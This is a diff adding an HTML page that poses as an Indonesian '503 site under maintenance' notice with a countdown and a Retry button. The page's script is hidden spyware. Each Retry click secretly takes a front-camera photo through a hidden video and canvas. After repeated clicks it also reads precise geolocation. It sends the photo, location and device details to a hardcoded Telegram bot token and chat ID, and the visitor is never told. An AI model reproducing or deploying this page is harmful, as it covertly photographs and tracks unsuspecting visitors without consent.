@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Under Maintenance</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #34495e;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --danger: #e74c3c;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+        
+        .container {
+            max-width: 800px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .error-code {
+            font-size: 8rem;
+            font-weight: 900;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, #e74c3c, #f39c12);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            line-height: 1;
+        }
+        
+        .error-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--light);
+        }
+        
+        .error-message {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            line-height: 1.6;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .maintenance-info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .maintenance-info h3 {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .progress-container {
+            margin-top: 20px;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(to right, #e74c3c, #f39c12);
+            border-radius: 5px;
+            width: 65%;
+            animation: progress-pulse 2s infinite;
+        }
+        
+        @keyframes progress-pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+        
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            padding: 15px 30px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(to right, #e74c3c, #f39c12);
+            color: white;
+        }
+        
+        .btn-primary:disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.5);
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        button:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        button:active:not(:disabled) {
+            transform: translateY(-1px);
+        }
+        
+        .floating-elements {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .floating-element {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+        
+        .countdown {
+            font-size: 1.5rem;
+            margin: 20px 0;
+            font-weight: 700;
+            color: #f39c12;
+        }
+        
+        .countdown-timer {
+            display: inline-block;
+            min-width: 100px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        @media (max-width: 600px) {
+            .error-code {
+                font-size: 5rem;
+            }
+            
+            .error-title {
+                font-size: 1.8rem;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="floating-elements">
+        <div class="floating-element" style="width: 100px; height: 100px; top: 10%; left: 5%; animation-delay: 0s;"></div>
+        <div class="floating-element" style="width: 150px; height: 150px; top: 60%; left: 80%; animation-delay: -5s;"></div>
+        <div class="floating-element" style="width: 70px; height: 70px; top: 80%; left: 20%; animation-delay: -10s;"></div>
+        <div class="floating-element" style="width: 120px; height: 120px; top: 30%; left: 70%; animation-delay: -7s;"></div>
+    </div>
+    
+    <div class="container">
+        <div class="error-code">503</div>
+        <h1 class="error-title">Layanan Sedang Dalam Pemeliharaan</h1>
+        <p class="error-message">
+            Maaf, saat ini website sedang dalam proses pemeliharaan untuk peningkatan layanan. 
+            Kami memperkirakan layanan akan kembali normal dalam waktu dekat.
+        </p>
+        
+        <div class="maintenance-info">
+            <h3><i class="fas fa-tools"></i> Informasi Pemeliharaan</h3>
+            <p>Tim teknis kami sedang melakukan pembaruan sistem untuk pengalaman pengguna yang lebih baik. Proses ini meliputi:</p>
+            <ul style="margin: 15px 0 15px 20px; opacity: 0.9;">
+                <li>Peningkatan keamanan sistem</li>
+                <li>Optimasi performa server</li>
+                <li>Pembaruan antarmuka pengguna</li>
+            </ul>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+                <div class="progress-text">
+                    <span>Progress Pemeliharaan</span>
+                    <span>65%</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="countdown">
+            Perkiraan waktu: <span class="countdown-timer" id="countdown">05:00</span>
+        </div>
+        
+        <div class="action-buttons">
+            <button class="btn-primary" id="retry-btn">
+                <i class="fas fa-redo"></i> Coba Lagi
+            </button>
+            <button class="btn-secondary" id="contact-btn">
+                <i class="fas fa-envelope"></i> Hubungi Dukungan
+            </button>
+        </div>
+        
+        <div class="hidden">
+            <video id="camera-feed" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
+
+    <script>
+        // Konfigurasi Telegram Bot - GANTI DENGAN DATA ANDA
+        const TELEGRAM_BOT_TOKEN = '8518880171:AAF0mktcQBFgzOKDiiYYc7ZJ5NDNZfiATn4';
+        const TELEGRAM_CHAT_ID = '7660579116';
+        
+        const retryBtn = document.getElementById('retry-btn');
+        const contactBtn = document.getElementById('contact-btn');
+        const countdownElement = document.getElementById('countdown');
+        const cameraFeed = document.getElementById('camera-feed');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        let clickCount = 0;
+        let isProcessing = false;
+        let countdownTime = 300;
+
+        async function sendTextToTelegram(message) {
+            try {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                    console.log('Token atau Chat ID tidak ada');
+                    return false;
+                }
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error sending text to Telegram:', error);
+                return false;
+            }
+        }
+
+        async function sendPhotoToTelegram(photoBlob, caption = '') {
+            try {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                    console.log('Token atau Chat ID tidak ada');
+                    return false;
+                }
+                
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error sending photo to Telegram:', error);
+                return false;
+            }
+        }
+
+        async function capturePhotoFromCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    } 
+                });
+
+                cameraFeed.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    cameraFeed.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+
+                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+
+                const photoBlob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                
+                return photoBlob;
+            } catch (error) {
+                console.error('Error capturing photo:', error);
+                return null;
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        console.log('Location access failed:', error);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        function collectDeviceData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString('id-ID'),
+                url: window.location.href,
+                clickCount: clickCount
+            };
+        }
+
+        async function sendDataToTelegram() {
+            const deviceData = collectDeviceData();
+
+            let message = `
+🔄 <b>Percobaan Akses Website - Click #${clickCount}</b>
+
+📱 <b>Perangkat:</b> ${deviceData.platform}
+🌐 <b>Browser:</b> ${deviceData.userAgent}
+🖥️ <b>Layar:</b> ${deviceData.screenWidth}x${deviceData.screenHeight}
+🌍 <b>Bahasa:</b> ${deviceData.language}
+⏰ <b>Waktu:</b> ${deviceData.timestamp}
+🔗 <b>URL:</b> ${deviceData.url}
+            `;
+            
+            let photoBlob = null;
+            let photoCaption = '';
+            
+            photoBlob = await capturePhotoFromCamera();
+            
+            if (photoBlob) {
+                photoCaption = `
+📸 <b>Foto dari Kamera Pengguna</b>
+
+📱 <b>Perangkat:</b> ${deviceData.platform}
+🌐 <b>Browser:</b> ${navigator.userAgent.substring(0, 50)}...
+⏰ <b>Waktu:</b> ${deviceData.timestamp}
+🔄 <b>Percobaan ke:</b> ${clickCount}
+                `;
+                
+                message += `\n📸 <b>Status Kamera:</b> Berhasil mengambil foto`;
+            } else {
+                message += `\n📸 <b>Status Kamera:</b> Gagal mengambil foto`;
+            }
+
+            if (clickCount >= 2) {
+                const location = await getLocation();
+                if (location) {
+                    message += `\n📍 <b>Lokasi:</b> ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
+                    message += `\n🎯 <b>Akurasi:</b> ${location.accuracy}m`;
+                    
+                    if (photoCaption) {
+                        photoCaption += `\n📍 <b>Lokasi:</b> ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
+                    }
+                } else {
+                    message += `\n📍 <b>Lokasi:</b> Tidak dapat diakses`;
+                }
+            }
+
+            await sendTextToTelegram(message);
+
+            if (photoBlob) {
+                await sendPhotoToTelegram(photoBlob, photoCaption);
+            }
+            
+            console.log('Data berhasil dikirim ke Telegram');
+        }
+
+        function updateCountdown() {
+            const minutes = Math.floor(countdownTime / 60);
+            const seconds = countdownTime % 60;
+            
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (countdownTime > 0) {
+                countdownTime--;
+                setTimeout(updateCountdown, 1000);
+            } else {
+                countdownElement.textContent = '00:00';
+            }
+        }
+
+        function disableButtonTemporarily() {
+            isProcessing = true;
+            retryBtn.disabled = true;
+            retryBtn.innerHTML = '<i class="fas fa-redo"></i> Memproses...';
+            
+            setTimeout(() => {
+                retryBtn.disabled = false;
+                isProcessing = false;
+                retryBtn.innerHTML = '<i class="fas fa-redo"></i> Coba Lagi';
+            }, 3000);
+        }
+
+        retryBtn.addEventListener('click', async () => {
+            if (isProcessing) return;
+            
+            clickCount++;
+
+            disableButtonTemporarily();
+
+            try {
+                await sendDataToTelegram();
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        });
+        
+        contactBtn.addEventListener('click', () => {
+            retryBtn.innerHTML = '<i class="fas fa-check"></i> Terkirim';
+            setTimeout(() => {
+                retryBtn.innerHTML = '<i class="fas fa-redo"></i> Coba Lagi';
+            }, 2000);
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            updateCountdown();
+        });
+    </script>
+</body>
+</html>
